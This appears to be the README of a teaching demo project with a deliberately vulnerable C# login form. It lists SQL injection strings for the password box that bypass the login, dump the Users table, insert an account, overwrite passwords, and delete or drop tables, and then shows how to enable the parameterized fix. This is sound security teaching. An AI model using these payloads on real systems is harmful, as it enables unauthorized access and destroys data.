#  This is Demo for SQL Injection Attack hello <br>

__Usebackup file `DemoSQLi.bak` to set up Database__ <br>
__Run file `SQLi.sln` to open project__ <br>
__Change DataSource in file `MyDB.cs` to Connect to database__ <br>
![image](https://github.com/user-attachments/assets/d3388462-80da-4909-8411-71a04ba8e00f) <br> <br>

__To Login input username and password following this table__ <br>
![image](https://github.com/user-attachments/assets/903733c5-5dfa-478a-92fc-c926a99f126a) <br>

__Run Program and login normally__ <br>
![image](https://github.com/user-attachments/assets/be7584b8-dfc0-4e15-a98b-a84f8798982c) <br>

__Exit and try to perform SQL injection attack__ <br>
![image](https://github.com/user-attachments/assets/9d816923-2e97-4954-a480-6f3a29591305) <br>

Enter something in `username` TextBox <br>
Enter these following strings one by one into the `password` TextBox:
```
' or 1=1 -- Login
' or 1=1 UNION SELECT * FROM Users -- Stealing
' or 1=1; INSERT INTO Login(username, password) VALUES ('inject1', '12345')  -- Insert 
' or 1=1; UPDATE Login SET password = 'ThisIsInjectedPassWord' -- Change Password
' or 1=1; DELETE FROM users1 -- Delete  
' or 1=1; DROP TABLE USERS1 -- DROP TABLE
```
<br>
And Observe database changes <br>


# To Prevent SQL Injection Attack <br>
Open file `LoginForm.cs` <br> 
__Comment line 30, 31 and uncomment line 33 to 38__ <br>
![image](https://github.com/user-attachments/assets/4fb4d29b-31e6-439e-bce0-3b0122a1d5ea) <br>

__Try to login by SQL injection. The result is `Invalid Login`__


